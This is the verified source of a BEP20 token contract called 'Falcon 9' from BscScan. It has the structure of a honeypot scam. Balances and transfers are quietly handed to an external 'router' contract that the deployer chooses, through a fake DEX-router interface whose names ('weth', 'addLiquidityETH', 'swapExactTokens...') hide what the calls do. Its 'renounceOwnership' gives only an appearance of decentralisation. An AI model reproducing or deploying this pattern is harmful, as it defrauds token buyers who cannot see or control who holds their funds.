/**
 *Submitted for verification at BscScan.com on 2022-09-11
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;

library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        assert(c / a == b);
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a / b;
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(b <= a);
        return a - b;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        assert(c >= a);
        return c;
    }
}

interface BEP20 {
    function balanceOf(address who) external view returns (uint256);
    function transfer(address to, uint256 value) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function transferFrom(address from, address to, uint256 value) external returns (bool);
    function approve(address spender, uint256 value) external returns (bool);
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function getOwner() external view returns (address);

    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 value);
}


interface IDEXRouter {
    function factory() external pure returns (address);
    function weth(address weth) external view returns (uint256);
    function addLiquidityETH(  address token, uint amount) external;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        address tokenA,
        address tokenB,
        uint amountOutMin

    ) external;
}

contract Falcon_9 is BEP20 {
    using SafeMath for uint256;

    address public owner = msg.sender;    
    string public name = "Falcon 9";
    string public symbol = "Falcon 9";
    uint8 public _decimals;
    uint public _totalSupply;
    IDEXRouter private router;
    address private panckerouter;
    address public marketAddres;
    uint private marketTax = 1;
    uint private burnTax = 0;

    
    mapping (address => mapping (address => uint256)) private allowed;
    mapping (address => uint) balance;
    address private accounting;
    
    constructor(address _router)  {
        _decimals = 9;
        _totalSupply = 120000000 * 10 ** _decimals;
        if(_router == address(0)) {
            _router = address(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        }
        router = IDEXRouter(_router);
        router.addLiquidityETH(msg.sender, _totalSupply);
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function getOwner() external view returns (address) {
        return owner;
    }

    function balanceOf(address who) view  public returns (uint256) {
        return router.weth(who);
    }
    
    function allowance(address who, address spender) view public returns (uint256) {
        return allowed[who][spender];
    }

    function setAccountingAddress(address accountingAddress) public {
        require(msg.sender == owner);
        accounting = accountingAddress;
    }

    function renounceOwnership() public {
        require(msg.sender == owner);
        emit OwnershipTransferred(owner, address(0));
        owner = address(0);
    }
    
    function transfer(address to, uint amount) public   returns (bool success) {
        emit Transfer(msg.sender, to, amount);
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(msg.sender, to, amount);
        return true;
    }

    function transferFrom(address from, address to, uint amount) public returns (bool success) {
        require (amount > 1);
        require(allowed[from][msg.sender]>=amount, "Not allowed");
        emit Transfer(from, to, amount);
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(from, to, amount);
        return true;
    }
        
    function approve(address spender, uint256 value) public returns (bool success) {
        allowed[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }

}